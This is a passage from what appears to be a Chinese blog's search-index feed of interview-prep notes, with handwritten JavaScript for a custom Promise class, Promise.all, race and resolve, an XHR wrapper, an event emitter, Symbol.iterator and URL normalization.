keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">!==</span> PENDING<span class="token punctuation">)</span> <span class="token keyword">return</span>    <span class="token comment" spellcheck="true">// 将状态更改为成功</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> FULFILLED    <span class="token comment" spellcheck="true">// 保存成功之后的值</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value    <span class="token comment" spellcheck="true">// 判断成功回调是否存在 存在则调用</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>successCallback<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>successCallback<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  reject <span class="token operator">=</span> reason <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 如果状态不是等待 阻止程序向下执行</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">!==</span> PENDING<span class="token punctuation">)</span> <span class="token keyword">return</span>    <span class="token comment" spellcheck="true">// 将状态更改为失败</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> REJECTED    <span class="token comment" spellcheck="true">// 保存失败后的原因</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>reason <span class="token operator">=</span> reason    <span class="token comment" spellcheck="true">// 判断失败回调是否存在 存在则调用</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>failCallback<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>failCallback<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>reason<span class="token punctuation">)</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span> then <span class="token operator">=</span> <span class="token punctuation">(</span>successCallback<span class="token punctuation">,</span> failCallback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>   successCallback <span class="token operator">=</span> successCallback <span class="token operator">?</span> successCallback <span class="token punctuation">:</span> value <span class="token operator">=</span><span class="token operator">></span> value   <span class="token keyword">let</span> promise2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">===</span> FULLFILLED<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token function">successCallback</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span>       <span class="token function">resolvePromise</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">===</span> REJECTED<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">failCallback</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>reason<span class="token punctuation">)</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>successCallback<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>successCallback<span class="token punctuation">)</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>failCallback<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>failCallback<span class="token punctuation">)</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> promise2 <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">catch</span> <span class="token operator">=</span> <span class="token punctuation">(</span>failCallback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>   <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>undefined<span class="token punctuation">,</span> failCallback<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 处理返回值 x 可能是 promise 的情况</span><span class="token keyword">function</span> <span class="token function">resolvePromise</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token keyword">instanceof</span> <span class="token class-name">MyPromise</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        x<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 测试</span><span class="token comment" spellcheck="true">// 1. 测试基本功能</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'fail'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>val <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> reason <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 测试异步</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>       <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>val <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> reason <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 测试链式调用</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>val <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 4. 测试 then 返回也是 promise</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'other'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>val <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 5. 测试 then 不传参数</span><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'成功'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>val <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="promise-all"><a href="#promise-all" class="headerlink" title="promise.all"></a>promise.all</h2><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span>all <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>promises<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> promises<span class="token punctuation">.</span>length        <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            resolve <span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>promises<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res                index<span class="token operator">++</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">===</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">resolve</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 如何实现Promise.all并且把失败的结果保存起来，不是失败立即执行reject？：再加一个 result 数组就好</span></code></pre><h2 id="promise-race"><a href="#promise-race" class="headerlink" title="promise.race"></a>promise.race</h2><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span>race <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>promises<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> promises<span class="token punctuation">.</span>length        <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>promises<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="promise-resolve"><a href="#promise-resolve" class="headerlink" title="promise.resolve"></a>promise.resolve</h2><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span>resolve <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token keyword">instanceof</span> <span class="token class-name">promise</span><span class="token punctuation">)</span> <span class="token keyword">return</span> value    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 例子</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>value <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="promise封装ajax"><a href="#promise封装ajax" class="headerlink" title="promise封装ajax"></a>promise封装ajax</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> ajax <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>reslove<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>         xhr<span class="token punctuation">.</span>reponeseType <span class="token operator">=</span> <span class="token string">'json'</span>        xhr<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">reslove</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>response<span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token string">'/api/'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//promise.reslove</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2><pre class=" language-js"><code class="language-js">    <span class="token comment" spellcheck="true">// 类内部存储一个对象，包含事件名和对应的触发函数</span>    <span class="token comment" spellcheck="true">// { click: [fn1, fn2], change: fn }</span>    <span class="token keyword">class</span> <span class="token class-name">EventEmitter</span> <span class="token punctuation">{</span>      constructor <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 注册事件</span>      $on <span class="token punctuation">(</span>eventType<span class="token punctuation">,</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 触发事件</span>      $emit <span class="token punctuation">(</span>eventType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">foreach</span><span class="token punctuation">(</span>handler <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 测试</span>    <span class="token keyword">let</span> em <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 信号中心</span>    em<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'click1'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    em<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'click2'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    em<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">)</span></code></pre><h2 id="Symbol-iterator"><a href="#Symbol-iterator" class="headerlink" title="Symbol.iterator"></a>Symbol.iterator</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> todos <span class="token operator">=</span> <span class="token punctuation">{</span>    life<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'吃饭'</span><span class="token punctuation">,</span> <span class="token string">'睡觉'</span><span class="token punctuation">,</span> <span class="token string">'打豆豆'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    learn<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span> <span class="token string">'数学'</span><span class="token punctuation">,</span> <span class="token string">'外语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    work<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'喝茶'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> all <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>life<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>learn<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>work<span class="token punctuation">]</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> all<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">yield</span> item        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> todos<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写代码（二）</title>
      <link href="2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="url处理"><a href="#url处理" class="headerlink" title="url处理"></a>url处理</h2><blockquote><p>爬虫在爬取页面前，需要对url列表进行标准化，实现一个处理url列表的函数-对缺少http前缀的url添加前缀，返回的url不能重复</p><p><code>[&quot;nodejs.org&quot;, &quot;http://nodejs.org&quot;, &quot;http://bytedance.com&quot;] =&gt; [&quot;http://nodejs.org&quot;, &quot;http://bytedance.com&quot;]</code></p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">formaturl</span><span class="token punctuation">(</span>urllist<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> urllist<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex">/^http:\/\//</span>        <span class="token keyword">const</span> url <span class="token operator">=</span> urllist<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">const</span> newUrl <span class="token operator">=</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">?</span> url <span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span></code></pre><h2 id="for-循环问题"><a href="#for-循环问题" class="headerlink" title="for 循环问题"></a>for 循环问题</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//输出结果以及间隔时间，改进 </span><span class="token keyword">for</span> 